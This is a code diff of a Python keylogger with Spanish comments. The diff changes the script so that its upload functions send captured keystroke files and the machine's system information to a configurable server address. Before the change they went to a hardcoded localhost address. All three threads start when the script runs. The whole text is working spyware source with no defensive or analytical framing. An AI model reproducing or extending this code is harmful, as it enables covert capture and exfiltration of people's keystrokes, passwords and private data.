@@ -55,7 +55,7 @@ def keylogger():
 
 
 
-def uploadData():
+def uploadData(urlServer):
       # Para hacer pruebas. Para un funcionamiento permantente, comentar la siguiente línea.
       i = 0
 
@@ -69,7 +69,7 @@ def uploadData():
             try:
                   f= open('keylogger_{}.txt'.format(d),'r')
                   text = f.read()
-                  response = requests.get('http://localhost:5000/upload/' + text )
+                  response = requests.get(urlServer + '/upload/' + text )
 
             except Exception as e:
                   print('No encontrado')
@@ -78,7 +78,7 @@ def uploadData():
             # Para hacer pruebas. Para un funcionamiento permantente, comentar la siguiente línea.
             i = i + 1
 
-def uploadSysInfo():
+def uploadSysInfo(urlServer):
       file= open('systemInfo.txt','w')
       hostname = socket.gethostname() # Nombre de la PC
       text = ''
@@ -90,19 +90,19 @@ def uploadSysInfo():
       file.write(text)
       file.close()
       text = 'var sysInfo = \\`' + text + '\\`'
-      requests.get('http://localhost:5000/uploadSysInfo/' + text.replace('\\','') )
+      requests.get( urlServer + '/uploadSysInfo/' + text.replace('\\','') )
       
 
-def mainProcess():
+def mainProcess(urlServer):
       print('Proceso principal.')
       
       p01 = threading.Thread(name='Keylogger', target=keylogger)
-      p02 = threading.Thread(name='uploadData', target=uploadData)
-      p03 = threading.Thread(name='uploadSysInfo', target=uploadSysInfo)
+      p02 = threading.Thread(name='uploadData', target=uploadData,args=(urlServer,))
+      p03 = threading.Thread(name='uploadSysInfo', target=uploadSysInfo,args=(urlServer,))
 
       p01.start()
       p02.start()
       p03.start()
 
 #Ejecutando el proceso principal.
-mainProcess()
+mainProcess('http://localhost:5000')
